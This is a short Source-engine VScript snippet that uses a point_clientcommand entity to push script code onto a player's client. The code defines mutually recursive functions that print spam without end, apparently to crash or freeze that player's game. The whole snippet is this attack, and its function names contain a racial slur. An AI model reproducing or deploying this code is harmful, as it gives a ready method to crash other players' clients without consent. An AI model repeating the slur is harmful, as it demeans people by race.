if (Entities.FindByClassname(null, "point_clientcommand") == null) {
    Entities.CreateByClassname("point_clientcommand")
} else {
    myclientcommand <- Entities.FindByClassname(null, "point_clientcommand")
}
command <- "script_client function timenigga2() { printl(\"timedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckman\"), timenigga()}function timenigga() { printl(\"timedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckmantimedrfuckman\"), timenigga2()};echo NEWLINE;script_client meme2 <- 10;echo NEWLINE;script_client while (meme2 > 0) { meme2 = meme2 - 1, printl(meme2), timenigga()}"
EntFireByHandle(myclientcommand, "Command", command, 0, Entities.FindByName(null, "red"), Entities.FindByName(null, "red"))